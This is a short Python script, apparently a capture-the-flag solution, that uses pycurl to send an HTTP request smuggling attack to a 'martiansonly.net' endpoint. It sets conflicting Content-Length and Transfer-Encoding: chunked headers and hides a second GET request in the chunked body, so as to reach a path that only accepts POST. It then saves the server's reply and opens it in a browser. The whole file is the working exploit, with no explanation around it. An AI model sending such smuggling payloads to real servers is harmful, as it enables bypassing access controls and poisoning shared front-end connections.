import requests 
import pycurl
import webbrowser
from io import BytesIO

response = BytesIO()

payload = """
0
GET /customsinspection HTTP/1.1

[
   "Ice Blocks"
]
"""

url = "http://srv2.martiansonly.net:9999/customsinspection"
#url = "http://smuggler.martiansonly.net/customsinspection"                              # Target endpoint, doesn't allow GET but allows POST
headers = [f'Content-Length: {len(payload)}','Transfer-Encoding: chunked']  # Set both headers   

req = pycurl.Curl()
req.setopt(req.FOLLOWLOCATION,True)
req.setopt(req.USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
req.setopt(req.VERBOSE, True)
req.setopt(req.URL, url)                # Target URL
req.setopt(req.POST, 1)                 # Enable POST
req.setopt(req.HTTPHEADER, headers)     # Load custom headers
req.setopt(req.POSTFIELDS, payload)     # Add data
req.setopt(req.WRITEDATA, response)     # Save data to variable
req.perform()

# Save the response data to a file
with open('response.html', 'wb') as f:
    f.write(response.getvalue())

# Open html to web browser
webbrowser.open('response.html')

